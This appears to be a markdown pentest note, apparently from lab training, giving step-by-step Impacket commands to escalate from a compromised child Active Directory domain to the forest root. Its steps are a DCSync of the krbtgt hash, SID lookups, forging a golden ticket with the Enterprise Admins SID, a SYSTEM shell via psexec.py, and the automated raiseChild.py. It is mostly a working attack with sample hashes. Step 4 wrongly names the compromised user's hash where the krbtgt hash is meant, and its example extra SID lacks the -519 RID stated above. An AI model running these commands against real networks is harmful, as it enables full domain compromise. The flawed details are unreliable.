# Attacking Domain Trusts From Linux
## Preforming Manual Attack
To perform this attack from a **Linux attack host**, we  need to gather the following:

* The **KRBTGT hash** of the **child domain**
* The **Security Identifier (SID)** of the **child domain**
* The **Fully Qualified Domain Name (FQDN)** of the **child domain**
* The **SID of the Enterprise Admins group** in the **root domain**
* The **name of a target user** within the child domain (*note: the account does not need to actually exist*)

Once all of this data is collected, the attack can be carried out using the appropriate tools from the Linux environment (e.g., **Impacket**).

1. Get **KRBTGT hash** of the **child domain**
Performing DCSync with `secretsdump.py`
```shell
secretsdump.py <Child Domain>/<Compromised User>@<Compromised Tareget IP> -just-dc-user Child/krbtgt
secretsdump.py logistics.CORP.local/STEVE@10.10.10.211 -just-dc-user LOGISTICS/krbtgt
```
<img width="1987" height="380" alt="image" src="https://github.com/user-attachments/assets/cc213cc4-d5db-49e6-aadd-63545e2f4c77" />

2. Using lookupsid.py from the Impacket toolkit to perform SID brute forcing to find the **SID of the child domain**
```shell
lookupsid.py <Child Domain>/<Compromised User>@<Compromised Tareget IP> | grep "Domain SID"
lookupsid.py logistics.CORP.local/STEVE@10.10.10.211 | grep "Domain SID"
```
<img width="1884" height="210" alt="image" src="https://github.com/user-attachments/assets/ae3176db-1b5d-4082-9bd3-3349c1553de5" />

3. Get **SID of the Enterprise Admins group** in the **root domain**

```shell
lookupsid.py <Child Domain>/<Compromised User>@<DC Tareget IP> | grep -B12 "Enterprise Admins"
lookupsid.py logistics.CORP.local/STEVE@10.10.10.5 | grep -B12 "Enterprise Admins"
```
<img width="1534" height="498" alt="image" src="https://github.com/user-attachments/assets/e4f122ee-6c3e-462e-a155-77b5f2188898" />
SID of the Enterprise Admins will be Domain SID + CORP\Enterprise Admins (SidTypeGroup)
In Current Example = `S-1-5-21-3842939050-3880317879-2865463114-519`

4. Constructing a Golden Ticket using ticketer.py

```shell
ticketer.py -nthash <NTHash From Compromised User> -domain <Child Domain> -domain-sid <ChildDomain SID> -extra-sid <SID of the Enterprise Admins group> <Fake name of a target user>

ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.CORP.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114 AnubisXploit
```
<img width="2559" height="346" alt="image" src="https://github.com/user-attachments/assets/269fbc13-73ca-422e-8348-1a0d69638a72" />
<img width="1398" height="72" alt="image" src="https://github.com/user-attachments/assets/5d90b485-0912-4d35-8b16-fcb059e3ebcd" />

5. Setting the KRB5CCNAME Environment Variable
```shell
export KRB5CCNAME=AnubisXploit.ccache
```

6. Getting a SYSTEM shell using Impacket's psexec.py
```shell
psexec.py <Child Domain>/<Fake Created User>@<Domain Controller> -k -no-pass -target-ip <DC-IP>

psexec.py LOGISTICS.CORP.LOCAL/AnubisXploit@dc01.corp.local -k -no-pass -target-ip <DC-IP>
```

---

## Using Automated Impacket Tool
```shell
raiseChild.py -target-exec <Domain Controller IP> <Child Domain>/<Compromised User>

raiseChild.py -target-exec 10.10.10.5 logistics.CORP.local/STEVE
```


